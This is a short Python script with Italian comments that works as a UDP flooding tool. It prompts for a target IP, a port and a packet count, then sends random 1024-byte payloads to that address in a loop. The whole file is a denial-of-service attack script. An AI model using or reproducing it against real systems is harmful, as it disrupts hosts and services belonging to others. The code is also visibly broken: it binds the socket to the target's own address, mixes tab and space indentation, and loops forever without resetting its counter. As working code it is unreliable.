import socket
import random        #Abbiamo importato la libreria random per la misura della grandezza dei pacchetti

IP_target = input("Inserisci indirizzo IP target:  ")
porta_target = int (input("Inserisci l'indirizzo della porta:  "))
pacchetti = int (input("Inserisci quanti pacchetti vuoi inviare:  "))
i=0

while True:            
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind((IP_target, porta_target))
        data = random.randbytes(1024)
        addr = (str(IP_target), int (porta_target))

        while i<pacchetti:                         #Scelta del n. di pacchetti per poi spedirli
                s.sendto (data, addr)
        	i=i+1
	s.close()

